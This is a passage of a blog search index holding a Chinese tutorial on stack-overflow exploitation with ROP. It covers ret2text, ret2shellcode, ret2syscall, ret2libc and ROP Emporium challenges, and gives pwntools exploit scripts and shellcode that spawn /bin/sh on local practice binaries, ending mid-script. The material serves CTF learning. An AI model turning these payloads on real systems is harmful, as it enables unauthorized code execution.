<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>基本栈溢出利用</title>
      <link href="/2019/04/28/test/"/>
      <url>/2019/04/28/test/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li>函数名查询 <code>ns binary | grep &#39; t &#39;</code></li><li>GOT表 <code>readelf --relocs binary</code></li><li>PLT表 <code>objdump -M intel -dj .plt binary</code></li><li>字符串 <code>rabin2 -z binary</code></li><li>rooper <code>pipenv run ropper --file binary --search &quot;xor&quot;</code></li><li><code>vmmap</code> 不同段权限</li></ul><h3 id="pwntools相关"><a href="#pwntools相关" class="headerlink" title="pwntools相关"></a>pwntools相关</h3><p><code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)</code></p><p><code>gdb.attach(sh,&#39;b *0xbb&#39;)</code></p><p><code>r.sendline(asm(shellcraft.sh()))</code></p><h2 id="基础ROP"><a href="#基础ROP" class="headerlink" title="基础ROP"></a>基础ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>简单来说就是跳转到程序本身已有的代码，程序中如果有调用system(“/bin/sh”)的代码，直接将函数返回地址覆盖为目标地址。算偏移量可以使用<code>pattern offset</code>。</p><p>一个样例payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>控制程序执行shellcode代码，shellcode一般自己填充，shellcode所在的区域需要有可执行权限。</p><p>shellcode可以pwntools生成，或者<code>https://www.exploit-db.com/</code> 在线查找。也可以使用MSF生成。</p><h4 id="bss段执行"><a href="#bss段执行" class="headerlink" title="bss段执行"></a>bss段执行</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h4><p>这里列举两道题</p><p>第一道空间充足，可以直接<code>jmp esp</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to exploit train"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**************************************"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"see you~~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./Bin'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">jmp_esp = <span class="number">0x080484f0</span></span><br><span class="line">sh.sendline(<span class="number">112</span>*<span class="string">'A'</span>+p32(jmp_esp)+shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>原理是函数执行完<code>ret</code>后，<code>esp</code>从指向返回地址变为指向<code>esp+4</code>,<code>ret</code>可以理解为<code>pop eip</code>.</p><p>如果空间不足，没有充足的空间放置shellcode.可以产生类似<code>sub esp 0x28;jmp esp</code>指令，返回填充的最开头。</p><p>一个payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">"x31xc9xf7xe1x51x68x2fx2fx73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"x68x68x2fx62x69x6ex89xe3xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"x0bxcdx80"</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode_x86 + (</span><br><span class="line">    <span class="number">0x20</span> - len(shellcode_x86)) * <span class="string">'b'</span> + <span class="string">'bbbb'</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>控制程序执行系统调用</p><p>Syscall的函数调用规范为 <code>execve(&quot;/bin/sh&quot;,0,0);</code></p><p>对应汇编为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop eax,   # 系统调用号载入  execve为0xb</span><br><span class="line">pop ebx,   # 第一个参数 /bin/sh</span><br><span class="line">pop ecx,   # 第二个参数 0</span><br><span class="line">pop edx,   # 第三个参数，0</span><br><span class="line">int 0x80,  # 执行系统调用</span><br></pre></td></tr></table></figure><p>一个payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>控制函数执行libc中的函数，通常返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容） </p><h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08048720</span> : /bin/sh</span><br><span class="line"></span><br><span class="line">.plt:<span class="number">08048460</span> ; [<span class="number">00000006</span> BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">112</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>在正常调用system函数的时候，堆栈位置的system_plt之后的内容为system函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在system_plt和sh_addr之间增加了4个字符来进行填充。</p><h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf = <span class="number">0x804a040</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">'a'</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf, system_plt, <span class="number">0xdeadbeef</span>, buf])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里有几个点，buf的地址其实可以在buf段任意选取。<code>pop_ebx</code> 也可以任意选择<code>pop</code>指令，实际上是<code>pop ebp;ret</code>,目的是将esp+4。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A*<span class="number">112</span></span><br><span class="line">gets_addr</span><br><span class="line">pop</span><br><span class="line">buf</span><br><span class="line">system_addr</span><br><span class="line"><span class="number">0xdeedbeef</span></span><br><span class="line">buf</span><br></pre></td></tr></table></figure><h4 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h4><h2 id="ROPemporium"><a href="#ROPemporium" class="headerlink" title="ROPemporium"></a>ROPemporium</h2><p>八道ROP的练习题，每道题都有32位和64位的版本。</p><h3 id="ret2win32"><a href="#ret2win32" class="headerlink" title="ret2win32"></a>ret2win32</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ret2win by ROP Emporium"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"32bits\n"</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nExiting"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"</span></span><br><span class="line">    <span class="string">"What could possibly go wrong?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Thank you! Here's your flag:"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">44</span> + p32(<span class="number">0x08048659</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p><p>这里溢出就不是x86 PC的 <code>0x41414141</code>这样的地址，这时可以通过栈顶的数值计算。即<code>rsp</code>的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: <span class="number">0x7fffffffde20</span> (<span class="string">"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb"</span>)</span><br><span class="line">RBX: <span class="number">0x0</span> </span><br><span class="line">RCX: 0x6241414641413041 ('A0AAFAAb')</span><br><span class="line">RDX: <span class="number">0x7ffff7dd3790</span> --&gt; <span class="number">0x0</span> </span><br><span class="line">RSI: <span class="number">0x602041</span> (<span class="string">"AA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n"</span>)</span><br><span class="line">RDI: 0x7fffffffde51 --&gt; 0x3000000000004000 ('')</span><br><span class="line">RBP: 0x6141414541412941 ('A)AAEAAa')</span><br><span class="line">RSP: <span class="number">0x7fffffffde48</span> (<span class="string">"AA0AAFAAb"</span>)</span><br><span class="line">RIP: <span class="number">0x400810</span> (&lt;pwnme+<span class="number">91</span>&gt;:ret)</span><br><span class="line">R8 : 0x41412d4141434141 ('AACAA-AA')</span><br><span class="line">R9 : 0x413b414144414128 ('(AADAA;A')</span><br><span class="line">R10: 0x6141414541412941 ('A)AAEAAa')</span><br><span class="line">R11: <span class="number">0x246</span> </span><br><span class="line">R12: <span class="number">0x400650</span> (&lt;_start&gt;:xor    ebp,ebp)</span><br><span class="line">R13: <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x1</span> </span><br><span class="line">R14: <span class="number">0x0</span> </span><br><span class="line">R15: <span class="number">0x0</span></span><br><span class="line">EFLAGS: <span class="number">0x10246</span> (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x400809</span> &lt;pwnme+<span class="number">84</span>&gt;:call   <span class="number">0x400620</span> &lt;fgets@plt&gt;</span><br><span class="line">   <span class="number">0x40080e</span> &lt;pwnme+<span class="number">89</span>&gt;:nop</span><br><span class="line">   <span class="number">0x40080f</span> &lt;pwnme+<span class="number">90</span>&gt;:leave  </span><br><span class="line">=&gt; <span class="number">0x400810</span> &lt;pwnme+<span class="number">91</span>&gt;:ret    </span><br><span class="line">   <span class="number">0x400811</span> &lt;ret2win&gt;:push   rbp</span><br><span class="line">   <span class="number">0x400812</span> &lt;ret2win+<span class="number">1</span>&gt;:mov    rbp,rsp</span><br><span class="line">   <span class="number">0x400815</span> &lt;ret2win+<span class="number">4</span>&gt;:mov    edi,<span class="number">0x4009e0</span></span><br><span class="line">   <span class="number">0x40081a</span> &lt;ret2win+<span class="number">9</span>&gt;:mov    eax,<span class="number">0x0</span></span><br><span class="line">[------------------------------------<span class="built_in">stack</span>-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0x7fffffffde48</span> (<span class="string">"AA0AAFAAb"</span>)</span><br><span class="line"><span class="number">0008</span>| <span class="number">0x7fffffffde50</span> --&gt; <span class="number">0x400062</span> --&gt; <span class="number">0x1f8000000000000</span> </span><br><span class="line"><span class="number">0016</span>| <span class="number">0x7fffffffde58</span> --&gt; <span class="number">0x7ffff7a2d830</span> (&lt;__libc_start_main+<span class="number">240</span>&gt;:mov    edi,eax)</span><br><span class="line"><span class="number">0024</span>| <span class="number">0x7fffffffde60</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">0032</span>| <span class="number">0x7fffffffde68</span> --&gt; <span class="number">0x7fffffffdf38</span> --&gt; <span class="number">0x7fffffffe2a1</span> (<span class="string">"/home/pwn/rop_emporium_all_challenges/ret2win/ret2win"</span>)</span><br><span class="line"><span class="number">0040</span>| <span class="number">0x7fffffffde70</span> --&gt; <span class="number">0x100000000</span> </span><br><span class="line"><span class="number">0048</span>| <span class="number">0x7fffffffde78</span> --&gt; <span class="number">0x400746</span> (&lt;main&gt;:push   rbp)</span><br><span class="line"><span class="number">0056</span>| <span class="number">0x7fffffffde80</span> --&gt; <span class="number">0x0</span> </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line"><span class="number">0x0000000000400810</span> in pwnme ()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400811</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">40</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="split32"><a href="#split32" class="headerlink" title="split32"></a>split32</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"split by ROP Emporium"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"32bits\n"</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nExiting"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Contriving a reason to ask user for data..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA中使用快捷键shift+f12可以直接看到程序中的所有字符串</p><p>这里的目的是将<code>/bin/cat flag.txt</code>参数传入<code>system</code>函数</p><p>这里是32位程序，函数的参数是放在栈上的，payload如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span 